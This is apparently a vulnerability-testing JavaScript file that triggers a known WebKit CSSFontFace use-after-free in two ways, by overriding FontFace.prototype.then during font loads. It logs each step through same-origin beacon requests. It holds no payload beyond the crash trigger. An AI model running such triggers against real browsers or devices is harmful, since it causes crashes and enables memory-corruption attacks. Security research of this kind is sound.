/*
 * p446: the CSSFontFace::iterateClients stale-client crash, on the 14.10 guide.
 *
 * Upstream: "Use-after-free in CSSFontFace::setStatus via CSSFontFace::load",
 * WebKit bug 313577, fixed in 5aedb82710ba578f by skipping a client that was
 * removed during iteration. The regression test is
 * LayoutTests/fonts/font-face-load-crash.html.
 *
 * Two triggers are run in one document, each with its own marker:
 *
 *   A - the upstream test verbatim: @font-face with src: local(Helvetica), the
 *       face looked up in document.fonts, face.loaded touched first, then a
 *       .then getter installed on FontFace.prototype that removes a style
 *       element and forces layout.
 *   B - a network face: new FontFace() with a data: URI, so the load settles
 *       asynchronously and the getter runs when the promise resolves later.
 *
 * The beacon is a synchronous XHR, because an asynchronous one does not
 * necessarily leave the renderer before a crash in the same call.
 */
(function () {
    var s = 'ff';
    try {
        s = sessionStorage.getItem('v172s') || Math.random().toString(36).slice(2, 8);
        sessionStorage.setItem('v172s', s);
    } catch (e) {}

    function mark(tag) {
        var url = location.origin + '/beacon/V172-' + s + '-' + tag + '?t=' + Date.now();
        try {
            var x = new XMLHttpRequest();
            x.open('GET', url, false);
            x.send();
        } catch (e) {
            try { navigator.sendBeacon(url); } catch (e2) {}
        }
    }

    mark('BEFORE-fontface');

    var hasFontFace = typeof FontFace !== 'undefined' && !!document.fonts;
    mark('API-' + (hasFontFace ? 'yes' : 'no'));
    if (!hasFontFace) return;

    // A handful of benign lookups first, so "API yes" does not hide an engine
    // that has the interfaces but cannot construct a face.
    try {
        var probeFace = new FontFace('feedface-probe', 'local(Arial)');
        mark('CONSTRUCT-' + (probeFace.family || 'empty'));
    } catch (e) {
        mark('CONSTRUCT-ERR-' + e);
    }

    // A: the upstream regression test.
    try {
        var style = document.createElement('style');
        style.textContent = '@font-face { font-family: ffA; src: local(Helvetica); }';
        document.head.appendChild(style);
        document.body.offsetHeight;
        var faceA = null;
        document.fonts.forEach(function (f) {
            if (f.family && f.family.replace(/['"]/g, '') === 'ffA') faceA = f;
        });
        mark('FACE-A-' + (faceA ? 'found' : 'missing'));
        if (faceA) {
            var p = faceA.loaded;
            var fired = false;
            Object.defineProperty(FontFace.prototype, 'then', {
                get: function () {
                    fired = true;
                    var victim = document.getElementById('victim-style');
                    if (victim) victim.remove();
                    document.body.offsetHeight;
                    return undefined;
                },
                configurable: true
            });
            faceA.load();
            mark('A-DONE-then=' + fired);
            delete FontFace.prototype.then;
        }
    } catch (e) {
        mark('A-ERR-' + e);
    }

    // B: an asynchronously settled face with a thenable of our own.
    try {
        var bytes = 'AAEAAAALAIAAAwAwT1MvMg8SAAAAAAABAAAAAAAYAAAAYGNtYXA';
        var faceB = new FontFace('ffB', 'url(data:font/ttf;base64,' + bytes + ')');
        document.fonts.add(faceB);
        var firedB = false;
        Object.defineProperty(FontFace.prototype, 'then', {
            get: function () {
                firedB = true;
                var v = document.getElementById('victim-style');
                if (v) v.remove();
                document.body.offsetHeight;
                return undefined;
            },
            configurable: true
        });
        faceB.load();
        mark('B-ISSUED');
        setTimeout(function () {
            mark('B-LATER-then=' + firedB);
            delete FontFace.prototype.then;
            mark('DONE');
        }, 1500);
    } catch (e) {
        mark('B-ERR-' + e);
        mark('DONE');
    }
})();
